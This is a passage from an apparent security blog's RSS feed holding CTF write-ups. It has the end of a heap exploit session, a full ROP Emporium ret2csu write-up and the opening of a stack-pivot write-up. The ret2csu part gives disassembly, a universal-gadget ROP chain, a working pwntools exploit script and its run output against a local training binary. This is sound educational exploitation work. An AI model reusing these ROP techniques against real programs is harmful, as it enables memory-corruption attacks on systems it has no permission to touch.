&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/.glibc/glibc_2.28_no-tcache/libc-2.28.so&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;23154&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
$ whoami
adamgold
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>ROP Emporium Ret2CSU Writeup</title>
      <link>https://adamgold.github.io/posts/ropemporium-ret2csu/</link>
      <pubDate>Sat, 04 Jan 2020 21:28:48 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/ropemporium-ret2csu/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;Last ROP Emporium callenge - &lt;a href=&#34;https://ropemporium.com/challenge/ret2csu.html&#34;&gt;Ret2CSU&lt;/a&gt;! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.&lt;/p&gt;
&lt;p&gt;Our goal is to call the &lt;code&gt;ret2win&lt;/code&gt; function with &lt;code&gt;rdx&lt;/code&gt; filled with &lt;code&gt;0xdeadcafebabebeef&lt;/code&gt;. As mentioned before, the main challenge here is having no gadgets allowing us to directly control &lt;code&gt;rdx&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Desktop/ctfs/ret2csu/ret2csu&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

pwndbg&amp;gt; disass main
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
   0x00000000004006d7 &amp;lt;+0&amp;gt;:	push   rbp
   0x00000000004006d8 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x00000000004006db &amp;lt;+4&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x20097e&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x601060 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004006e2 &amp;lt;+11&amp;gt;:	mov    ecx,0x0
   0x00000000004006e7 &amp;lt;+16&amp;gt;:	mov    edx,0x2
   0x00000000004006ec &amp;lt;+21&amp;gt;:	mov    esi,0x0
   0x00000000004006f1 &amp;lt;+26&amp;gt;:	mov    rdi,rax
   0x00000000004006f4 &amp;lt;+29&amp;gt;:	call   0x4005e0 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004006f9 &amp;lt;+34&amp;gt;:	mov    edi,0x4008c8
   0x00000000004006fe &amp;lt;+39&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400703 &amp;lt;+44&amp;gt;:	mov    eax,0x0
   0x0000000000400708 &amp;lt;+49&amp;gt;:	call   0x400714 &amp;lt;pwnme&amp;gt;
   0x000000000040070d &amp;lt;+54&amp;gt;:	mov    eax,0x0
   0x0000000000400712 &amp;lt;+59&amp;gt;:	pop    rbp
   0x0000000000400713 &amp;lt;+60&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass pwnme
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; pwnme:
   0x0000000000400714 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400715 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400718 &amp;lt;+4&amp;gt;:	sub    rsp,0x20
   0x000000000040071c &amp;lt;+8&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400720 &amp;lt;+12&amp;gt;:	mov    edx,0x20
   0x0000000000400725 &amp;lt;+17&amp;gt;:	mov    esi,0x0
   0x000000000040072a &amp;lt;+22&amp;gt;:	mov    rdi,rax
   0x000000000040072d &amp;lt;+25&amp;gt;:	call   0x4005c0 &amp;lt;memset@plt&amp;gt;
   0x0000000000400732 &amp;lt;+30&amp;gt;:	mov    edi,0x4008e1
   0x0000000000400737 &amp;lt;+35&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x000000000040073c &amp;lt;+40&amp;gt;:	mov    edi,0x4008f0
   0x0000000000400741 &amp;lt;+45&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400746 &amp;lt;+50&amp;gt;:	mov    edi,0x400924
   0x000000000040074b &amp;lt;+55&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400750 &amp;lt;+60&amp;gt;:	mov    edi,0x400925
   0x0000000000400755 &amp;lt;+65&amp;gt;:	mov    eax,0x0
   0x000000000040075a &amp;lt;+70&amp;gt;:	call   0x4005b0 &amp;lt;printf@plt&amp;gt;
   0x000000000040075f &amp;lt;+75&amp;gt;:	mov    eax,0x601018
   0x0000000000400764 &amp;lt;+80&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x000000000040076b &amp;lt;+87&amp;gt;:	mov    eax,0x601028
   0x0000000000400770 &amp;lt;+92&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400777 &amp;lt;+99&amp;gt;:	mov    eax,0x601030
   0x000000000040077c &amp;lt;+104&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400783 &amp;lt;+111&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2008e6&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x601070 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x000000000040078a &amp;lt;+118&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x000000000040078e &amp;lt;+122&amp;gt;:	mov    esi,0xb0
   0x0000000000400793 &amp;lt;+127&amp;gt;:	mov    rdi,rax
   0x0000000000400796 &amp;lt;+130&amp;gt;:	call   0x4005d0 &amp;lt;fgets@plt&amp;gt;
   0x000000000040079b &amp;lt;+135&amp;gt;:	mov    eax,0x601038
   0x00000000004007a0 &amp;lt;+140&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x00000000004007a7 &amp;lt;+147&amp;gt;:	mov    rdi,0x0
   0x00000000004007ae &amp;lt;+154&amp;gt;:	nop
   0x00000000004007af &amp;lt;+155&amp;gt;:	leave
   0x00000000004007b0 &amp;lt;+156&amp;gt;:	ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the disassembly, this challenge is pretty much the same as earlier challenges. We need to overflow the buffer in &lt;code&gt;pwnme&lt;/code&gt;, return to &lt;code&gt;ret2win&lt;/code&gt; BUT change &lt;code&gt;rdx&lt;/code&gt; first. Let&amp;rsquo;s hunt for gadgets:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/ret2csu$ ropper --file ret2csu --search &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop rdx&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Load gadgets from cache
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; loading... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; removing double gadgets... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Searching &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; gadgets: pop rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I tried searching for more rdx-related gadgets but could not find any. After struggling with this for some time, I discovered something I was unfamiliar with - &lt;a href=&#34;https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html&#34;&gt;Universal gadgets&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__libc_csu_init functions provides a few nice gadgets to load data into certain critical registers. Most importantly EDI, RSI and RDX.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That&amp;rsquo;s perfect! Let&amp;rsquo;s get these gadgets from the disassembly of the file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;objdump -d ./ret2csu -M intel

&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000400840&lt;/span&gt; :

400880:Â Â Â Â 4c &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; faÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â rdx,r15

Â Â 400883:Â Â Â Â 4c &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; f6Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â rsi,r14

Â Â 400886:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; efÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â edi,r13d

Â Â 400889:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; ff &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; dcÂ Â Â Â Â Â Â Â Â Â Â Â Â Â callÂ Â Â QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;r12+rbx*8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

Â Â 40088d:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; c3 01Â Â Â Â Â Â Â Â Â Â Â Â Â Â addÂ Â Â Â rbx,0x1

Â Â 400891:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; ddÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cmpÂ Â Â Â rbp,rbx

Â Â 400894:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; eaÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â jneÂ Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;400880&lt;/span&gt;

Â Â 400896:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; c4 08Â Â Â Â Â Â Â Â Â Â Â Â Â Â addÂ Â Â Â rsp,0x8

  .........


Â Â 40089a:Â Â Â Â 5bÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â rbx

Â Â 40089b:Â Â Â Â 5dÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â rbp

Â Â 40089c:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5cÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r12

Â Â 40089e:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5dÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r13

Â Â 4008a0:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5eÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r14

Â Â 4008a2:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5fÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r15

Â Â 4008a4:Â Â Â Â c3Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This allows us to move r15 into &lt;code&gt;rdx&lt;/code&gt; - But, then there&amp;rsquo;s a call to &lt;code&gt;[r12+rbx*8]&lt;/code&gt; and a &lt;code&gt;cmp&lt;/code&gt; instruction right after. We&amp;rsquo;re going to need to use the second section of gadgets shown above to control &lt;code&gt;r12&lt;/code&gt; and &lt;code&gt;rbx&lt;/code&gt;, so these instructions won&amp;rsquo;t get in our way.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s another useful quote from the article linked to above:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To effectively use mov rdx,r13 , we have to ensure that &lt;code&gt;call QWORD PTR [r12+rbx*8]&lt;/code&gt; doesn&amp;rsquo;t SIGSEGV, &lt;code&gt;cmp rbx,rbp&lt;/code&gt; equals and most importantly value of &lt;code&gt;RDX&lt;/code&gt; is not altered.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Also noted in the article is that it&amp;rsquo;s possible to use pointers for the &lt;code&gt;_init&lt;/code&gt; function, located at &lt;code&gt;&amp;amp;_DYNAMIC&lt;/code&gt;. That&amp;rsquo;s just what we need for &lt;code&gt;r12&lt;/code&gt;, as we&amp;rsquo;ll zero &lt;code&gt;rbx&lt;/code&gt; - &lt;code&gt;call [_init+0*8]&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/10gx &amp;amp;_DYNAMIC

0x600e20:Â Â Â Â 0x0000000000000001Â Â Â Â 0x0000000000000001

0x600e30:Â Â Â Â 0x000000000000000cÂ Â Â Â 0x0000000000400560

0x600e40:Â Â Â Â 0x000000000000000dÂ Â Â Â 0x00000000004008b4

0x600e50:Â Â Â Â 0x0000000000000019Â Â Â Â 0x0000000000600e10

0x600e60:Â Â Â Â 0x000000000000001bÂ Â Â Â 0x0000000000000008

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;0x600e48&lt;/code&gt; contains an address toÂ &lt;code&gt;0x00000000004008b4&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/4i 0x00000000004008b4

Â Â Â 0x4008b4 :Â Â Â Â subÂ Â Â Â rsp,0x8

Â Â Â 0x4008b8 :Â Â Â Â addÂ Â Â Â rsp,0x8

Â Â Â 0x4008bc :Â Â Â Â ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remember that after the call instruction, the program will again pop all registers until reaching the ret instruction. Also, we have &lt;code&gt;add rsp, 0x8&lt;/code&gt; meaning we need another dummy in the stack. Also, &lt;code&gt;rbp&lt;/code&gt; and &lt;code&gt;rbx&lt;/code&gt; must not be equal (because of the &lt;code&gt;cmp&lt;/code&gt; instruction)!&lt;/p&gt;
&lt;h3 id=&#34;summing-up&#34;&gt;Summing Up&lt;/h3&gt;
&lt;p&gt;Here&amp;rsquo;s the plan:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call first gadget at &lt;code&gt;0x0040089a&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pop all desired values.&lt;/li&gt;
&lt;li&gt;Register R12 = pointer to &lt;code&gt;__init&lt;/code&gt; address.&lt;/li&gt;
&lt;li&gt;Register R15 = &lt;code&gt;0xdeadcafebabebeef&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Register &lt;code&gt;RBX = 0x0&lt;/code&gt; while &lt;code&gt;RBP = 0x01&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Use second gadget at address 0x400880 that will put the values at correct registers.&lt;/li&gt;
&lt;li&gt;Place the address of ret2win function in the stack.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

ret2win &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004007b1&lt;/span&gt;
rdx_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadcafebabebeef&lt;/span&gt;
pop_rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000000040089a&lt;/span&gt;
mov_rdx_r15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400880&lt;/span&gt;
dynamic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x600e48&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploit&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./ret2csu&amp;#34;&lt;/span&gt;)
    pause()

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending buffer overflow&amp;#34;&lt;/span&gt;)

    rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pop_rbx) &lt;span style=&#34;color:#75715e&#34;&gt;# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# rbp=0x0&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# so rbp won&amp;#39;t equal rbx (cmp rbp, rbx must be false)&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(dynamic) &lt;span style=&#34;color:#75715e&#34;&gt;# r12&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# r13&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# r14&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rdx_val) &lt;span style=&#34;color:#75715e&#34;&gt;# r15 - our desired rbp value!&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(mov_rdx_r15)  &lt;span style=&#34;color:#75715e&#34;&gt;# popping everything again - mov rdx, r15; mov rsi, r14; mov rdi, r13d; call [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 400880; add rsp, 0x8;&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# because of add rsp,0x8 padding - this is a dummy&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# rbx&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# rbp&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r12&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r13&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r14&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r15&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(ret2win)

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvall())


&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    exploit()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;adamgold&lt;span style=&#34;color:#a6e22e&#34;&gt;@adamgold&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;VirtualBox:&lt;span style=&#34;color:#f92672&#34;&gt;~/&lt;/span&gt;Desktop&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ctfs&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ret2csu&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python exp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;
[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] sending buffer overflow
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Receiving all data: Done (&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;B)
[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] Process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt; stopped &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; exit code &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; (SIGSEGV) (pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2046&lt;/span&gt;)
[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] ROPE{&lt;span style=&#34;color:#f92672&#34;&gt;********&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>ROP Emporium Pivot Writeup</title>
      <link>https://adamgold.github.io/posts/ropemporium-pivot/</link>
      <pubDate>Fri, 03 Jan 2020 17:06:56 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/ropemporium-pivot/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the &lt;code&gt;ret2win&lt;/code&gt; function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.&lt;/p&gt;
&lt;p&gt;Using Ghidra, I spotted these functions - &lt;code&gt;pwnme&lt;/code&gt;, &lt;code&gt;ret2win&lt;/code&gt; and &lt;code&gt;uselessFunction&lt;/code&gt;. Let&amp;rsquo;s start by running the binary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pivot by ROP Emporium
64bits

Call ret2win&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10
Send your second chain now and it will land there
&amp;gt; a
Now kindly send your stack smash
&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then some gdb disassembling:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
